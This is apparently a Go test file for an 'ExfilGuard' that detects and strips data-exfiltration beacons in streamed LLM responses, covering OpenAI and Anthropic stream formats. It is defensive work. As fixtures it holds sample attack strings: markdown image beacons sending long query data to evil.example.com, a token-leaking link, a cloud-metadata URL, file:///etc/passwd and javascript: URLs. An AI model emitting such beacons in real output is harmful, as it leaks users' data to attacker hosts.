package stream

import (
	"context"
	"io"
	"regexp"
	"strings"
	"testing"

	"github.com/nenya/config"
)

func logGuard() *ExfilGuard {
	return NewExfilGuard(config.ExfilGuardConfig{Action: config.ExfilActionLog}, nil)
}

func stripGuard() *ExfilGuard {
	return NewExfilGuard(config.ExfilGuardConfig{Action: config.ExfilActionStrip}, nil)
}

func TestExfilGuardQueryLengthViolation(t *testing.T) {
	guard := stripGuard()
	longQuery := strings.Repeat("A", 400)
	content := "check ![beacon](https://evil.example.com/x?d=" + longQuery + ") done"
	got, action, reason := guard.FilterContent(content)
	if action != ActionRedact {
		t.Fatalf("expected strip, got %v (reason %q)", action, reason)
	}
	if reason != exfilReasonQueryLength {
		t.Errorf("expected query_length, got %q", reason)
	}
	if strings.Contains(got, "evil.example.com") {
		t.Errorf("expected beacon stripped, got %q", got)
	}
	if !strings.Contains(got, exfilStripPlaceholder) {
		t.Errorf("expected placeholder, got %q", got)
	}
}

func TestExfilGuardQueryEntropyViolation(t *testing.T) {
	guard := logGuard()
	smuggled := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
	content := "see [docs](https://ok.example.com/?q=" + smuggled + ") here"
	_, action, reason := guard.FilterContent(content)
	if action != ActionPass {
		t.Fatalf("log mode must pass content, got %v", action)
	}
	if reason != exfilReasonQueryEntropy {
		t.Errorf("expected query_entropy, got %q", reason)
	}
}

func TestExfilGuardBenignURLsPass(t *testing.T) {
	guard := logGuard()
	content := "See https://pkg.go.dev/net/http and [Go docs](https://go.dev/doc/) for details"
	got, action, reason := guard.FilterContent(content)
	if action != ActionPass || reason != "" {
		t.Fatalf("expected pass, got %v reason %q", action, reason)
	}
	if got != content {
		t.Errorf("content must be untouched, got %q", got)
	}
}

func TestExfilGuardHostAllowlist(t *testing.T) {
	guard := NewExfilGuard(config.ExfilGuardConfig{
		Action:       config.ExfilActionLog,
		AllowedHosts: []string{"trusted.example.com"},
	}, nil)
	_, _, reason := guard.FilterContent("leak [x](https://api.evil.com/?token=abc)")
	if reason != exfilReasonHostNotAllowed {
		t.Errorf("expected host_not_allowed, got %q", reason)
	}
	// Subdomains of an allowed entry pass.
	_, action, _ := guard.FilterContent("ok [y](https://sub.trusted.example.com/path)")
	if action != ActionPass {
		t.Errorf("expected subdomain of allowed host to pass, got %v", action)
	}
}

func TestExfilGuardIPLiterals(t *testing.T) {
	guard := logGuard()
	_, _, reason := guard.FilterContent("![m](http://169.254.169.254/latest/meta-data/)")
	if reason != exfilReasonIPLiteral {
		t.Errorf("expected ip_literal, got %q", reason)
	}

	permissive := NewExfilGuard(config.ExfilGuardConfig{
		Action:          config.ExfilActionLog,
		AllowIPLiterals: config.PtrTo(true),
	}, nil)
	_, _, reason = permissive.FilterContent("![m](http://203.0.113.7/x)")
	if reason != "" {
		t.Errorf("expected public IP literal to pass when allowed, got %q", reason)
	}
	_, _, reason = permissive.FilterContent("![m](http://127.0.0.1/admin)")
	if reason != exfilReasonPrivateIP {
		t.Errorf("expected loopback denied even when literals allowed, got %q", reason)
	}
}

func TestExfilGuardNonHTTPScheme(t *testing.T) {
	guard := logGuard()
	// Markdown with a non-http URL: bare-URL regex only matches http(s),
	// so drive the scheme check through a markdown link.
	_, _, reason := guard.FilterContent("[x](file:///etc/passwd)")
	if reason != exfilReasonScheme {
		t.Errorf("expected scheme violation, got %q", reason)
	}
	_, _, reason = guard.FilterContent("[x](javascript:alert(1))")
	if reason != exfilReasonScheme {
		t.Errorf("expected scheme violation for javascript, got %q", reason)
	}
}

func TestExfilGuardChunkBoundaryStraddle(t *testing.T) {
	guard := stripGuard()
	longQuery := strings.Repeat("Z", 300)
	full := "text ![beacon](https://evil.example.com/p?d=" + longQuery + ") tail"
	// Split the construct across chunks mid-URL.
	cut := strings.Index(full, "evil.example")
	parts := []string{full[:cut+6], full[cut+6:]}
	var out strings.Builder
	blocked := false
	for _, part := range parts {
		got, action, _ := guard.FilterContent(part)
		if action == ActionBlock {
			blocked = true
			break
		}
		out.WriteString(got)
	}
	if blocked {
		t.Fatal("strip guard must not block")
	}
	combined := out.String()
	if strings.Contains(combined, "evil.example.com/p?") {
		t.Errorf("expected smuggled URL tail neutralized, got %q", combined)
	}
	// The placeholder lands in the completing chunk.
	if !strings.Contains(combined, exfilStripPlaceholder) {
		t.Errorf("expected placeholder in completing chunk, got %q", combined)
	}
}

func TestExfilGuardMemoAcrossChunks(t *testing.T) {
	guard := stripGuard()
	bad := "![x](https://evil.example.com/?d=" + strings.Repeat("A", 300) + ")"
	// First pass strips the completed construct.
	_, action, _ := guard.FilterContent(bad)
	if action != ActionRedact {
		t.Fatalf("expected strip on first pass, got %v", action)
	}
	// A re-send of the same complete construct (fresh chunk) must strip
	// again: violations are re-spliced even though the verdict is cached.
	_, action, _ = guard.FilterContent(bad)
	if action != ActionRedact {
		t.Fatalf("expected re-strip of cached violation, got %v", action)
	}
}

func TestExfilGuardBlockMode(t *testing.T) {
	guard := NewExfilGuard(config.ExfilGuardConfig{Action: config.ExfilActionBlock}, nil)
	_, action, reason := guard.FilterContent("![x](https://evil.example.com/?d=" + strings.Repeat("A", 300) + ")")
	if action != ActionBlock {
		t.Fatalf("expected block, got %v", action)
	}
	if reason != exfilReasonQueryLength {
		t.Errorf("expected query_length, got %q", reason)
	}
	if !guard.IsBlocked() {
		t.Error("guard must flip to blocked")
	}
	// Subsequent calls keep reporting the block.
	if _, action, _ := guard.FilterContent("benign"); action != ActionBlock {
		t.Error("expected latched block")
	}
}

func TestExfilGuardInspectFull(t *testing.T) {
	guard := stripGuard()
	content := "a [one](https://ok.example.com/x) b ![two](https://evil.example.com/?d=" + strings.Repeat("B", 300) + ") c"
	got, action, reason := guard.InspectFull(content)
	if action != ActionRedact || reason != exfilReasonQueryLength {
		t.Fatalf("expected strip/query_length, got %v/%q", action, reason)
	}
	if strings.Contains(got, "evil.example.com") || !strings.Contains(got, "ok.example.com") {
		t.Errorf("expected only the violating surface stripped, got %q", got)
	}
}

func TestExfilGuardBareURL(t *testing.T) {
	guard := logGuard()
	_, _, reason := guard.FilterContent("fetch https://203.0.113.9/exfil?d=" + strings.Repeat("x", 400) + " now")
	if reason != exfilReasonIPLiteral {
		t.Errorf("expected ip_literal for bare IP URL, got %q", reason)
	}
}

func TestExfilGuardUppercaseSchemeBareURL(t *testing.T) {
	guard := logGuard()
	_, _, reason := guard.FilterContent("see HTTPS://203.0.113.9/exfil?d=" + strings.Repeat("x", 300) + " end")
	if reason != exfilReasonIPLiteral {
		t.Errorf("expected ip_literal for uppercase-scheme bare URL, got %q", reason)
	}
}

func TestExfilGuardAnthropicDeltaShape(t *testing.T) {
	guard := stripGuard()
	chunk := map[string]interface{}{
		"type": "content_block_delta",
		"delta": map[string]interface{}{
			"type": "text_delta",
			"text": "leak ![b](https://203.0.113.5/x?d=" + strings.Repeat("A", 300) + ")",
		},
	}
	rewritten, action := applyExfilGuard(chunk, guard)
	if rewritten == nil || action == ActionBlock {
		t.Fatal("strip guard must not block")
	}
	delta := rewritten["delta"].(map[string]interface{})
	if strings.Contains(delta["text"].(string), "203.0.113.5") {
		t.Errorf("expected Anthropic text surface stripped, got %v", delta["text"])
	}
}

func TestExfilGuardReasoningDeltaShape(t *testing.T) {
	guard := NewExfilGuard(config.ExfilGuardConfig{Action: config.ExfilActionBlock}, nil)
	chunk := map[string]interface{}{
		"choices": []interface{}{map[string]interface{}{
			"delta": map[string]interface{}{
				"reasoning_content": "plan ![b](https://evil.example.com/?d=" + strings.Repeat("A", 300) + ")",
			},
		}},
	}
	if got, action := applyExfilGuard(chunk, guard); action != ActionBlock || got != nil {
		t.Fatalf("expected block on violating reasoning delta, got action=%v got!=nil:%v", action, got != nil)
	}
}

func TestExfilGuardPartialBareURLDeferred(t *testing.T) {
	guard := stripGuard()
	// Growing prefix of one long URL: partial chunks must not be
	// evaluated (no memo entry, no strip until terminated).
	_, action, _ := guard.FilterContent("go to https://evil.example.com/?d=" + strings.Repeat("A", 150))
	if action != ActionPass {
		t.Fatalf("unterminated URL prefix must be deferred, got %v", action)
	}
	if len(guard.memo) != 0 {
		t.Fatalf("prefix must not be memoized, got %v", guard.memo)
	}
	// Terminator arrives: full URL evaluated once and stripped.
	got, action, _ := guard.FilterContent(strings.Repeat("A", 150) + " done")
	if action != ActionRedact {
		t.Fatalf("expected strip once terminated, got %v", action)
	}
	if strings.Contains(got, "evil.example.com") {
		t.Errorf("expected full URL stripped, got %q", got)
	}
}

func TestExfilGuardBareURLInMarkdownText(t *testing.T) {
	guard := logGuard()
	// Violating bare URL inside the markdown TEXT portion (benign href):
	// must still be evaluated.
	_, _, reason := guard.FilterContent("[see https://203.0.113.4/exfil?d=" + strings.Repeat("x", 300) + "](https://ok.example.com)")
	if reason != exfilReasonIPLiteral {
		t.Errorf("expected bare URL in text portion evaluated, got %q", reason)
	}
}

// TestExfilGuardWirePropagation is the end-to-end guarantee: a stripped
// delta must reach the READER OUTPUT rewritten, in both wire formats.
// In-memory map mutation alone proved to be a blind spot (iteration 2).
func TestExfilGuardWirePropagation(t *testing.T) {
	bad := "![b](https://203.0.113.5/x?d=" + strings.Repeat("A", 300) + ")"

	t.Run("openai passthrough", func(t *testing.T) {
		guard := stripGuard()
		lines := []string{
			`data: {"choices":[{"delta":{"content":"before "}}]}`,
			`data: {"choices":[{"delta":{"content":"` + bad + `"}}]}`,
			`data: {"choices":[{"delta":{"content":" after"}}]}`,
			`data: [DONE]`,
		}
		out := runReaderThroughGuard(t, guard, lines)
		if strings.Contains(out, "203.0.113.5") {
			t.Errorf("violating URL reached the wire: %q", out)
		}
		if !strings.Contains(out, exfilStripPlaceholder) {
			t.Errorf("placeholder missing from wire output: %q", out)
		}
		if !strings.Contains(out, "before ") || !strings.Contains(out, " after") {
			t.Errorf("benign chunks must pass untouched: %q", out)
		}
	})

	t.Run("anthropic passthrough", func(t *testing.T) {
		guard := stripGuard()
		lines := []string{
			`data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"before "}}`,
			`data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"` + bad + `"}}`,
			`data: {"type":"content_block_delta","delta":{"type":"text_delta","text":" after"}}`,
			`data: [DONE]`,
		}
		out := runReaderThroughGuard(t, guard, lines)
		if strings.Contains(out, "203.0.113.5") {
			t.Errorf("violating URL reached the wire (anthropic): %q", out)
		}
		if !strings.Contains(out, exfilStripPlaceholder) {
			t.Errorf("placeholder missing from wire output (anthropic): %q", out)
		}
	})
}

// runReaderThroughGuard feeds SSE lines through an SSETransformingReader
// wired with the guard and returns the transformed wire bytes.
func runReaderThroughGuard(t *testing.T, guard *ExfilGuard, lines []string) string {
	t.Helper()
	src := strings.NewReader(strings.Join(lines, "\n\n") + "\n\n")
	reader := NewSSETransformingReader(src, nil, context.Background())
	reader.SetExfilGuard(guard)
	var out strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := reader.Read(buf)
		out.Write(buf[:n])
		if err != nil {
			if err == io.EOF {
				break
			}
			t.Fatalf("reader: %v", err)
		}
	}
	return out.String()
}

// TestStreamFilterWirePropagation covers the same latent wire bug the
// exfil guard exposed: secret-pattern redaction must reach the reader
// output in passthrough flows, not just the in-memory map.
func TestStreamFilterWirePropagation(t *testing.T) {
	secretRe := regexp.MustCompile(`sk-[A-Za-z0-9]{8}`)
	guard := NewStreamFilter([]*regexp.Regexp{secretRe}, nil, "[REDACTED]", 4096)
	lines := []string{
		`data: {"choices":[{"delta":{"content":"key is "}}]}`,
		`data: {"choices":[{"delta":{"content":"sk-abcd1234 ok"}}]}`,
		`data: {"choices":[{"delta":{"content":" done"}}]}`,
		`data: [DONE]`,
	}
	src := strings.NewReader(strings.Join(lines, "\n\n") + "\n\n")
	reader := NewSSETransformingReader(src, nil, context.Background())
	reader.SetStreamFilter(guard)
	var out strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := reader.Read(buf)
		out.Write(buf[:n])
		if err != nil {
			if err == io.EOF {
				break
			}
			t.Fatalf("reader: %v", err)
		}
	}
	if strings.Contains(out.String(), "sk-abcd1234") {
		t.Errorf("secret reached the wire unredacted: %q", out.String())
	}
	if !strings.Contains(out.String(), "[REDACTED]") {
		t.Errorf("redaction label missing from wire output: %q", out.String())
	}
}

// TestExfilGuardOversizedChunkStrip pins the suffix-window coordinate
// contract: a chunk larger than the window must still splice the
// placeholder at the correct content offset.
func TestExfilGuardOversizedChunkStrip(t *testing.T) {
	guard := stripGuard()
	filler := strings.Repeat("x", 5000)
	content := filler + " ![b](https://203.0.113.5/x?d=" + strings.Repeat("A", 300) + ") tail"
	got, action, _ := guard.FilterContent(content)
	if action != ActionRedact {
		t.Fatalf("expected strip, got %v", action)
	}
	if strings.Contains(got, "203.0.113.5") {
		t.Errorf("violating URL leaked on oversized chunk: %q", got[len(got)-200:])
	}
	if !strings.Contains(got, exfilStripPlaceholder) {
		t.Errorf("placeholder missing: %q", got[len(got)-200:])
	}
	if !strings.HasPrefix(got, filler) {
		t.Errorf("filler must stay untouched: %q", got[:80])
	}
	if !strings.HasSuffix(got, " tail") {
		t.Errorf("tail must survive: %q", got[len(got)-40:])
	}
}
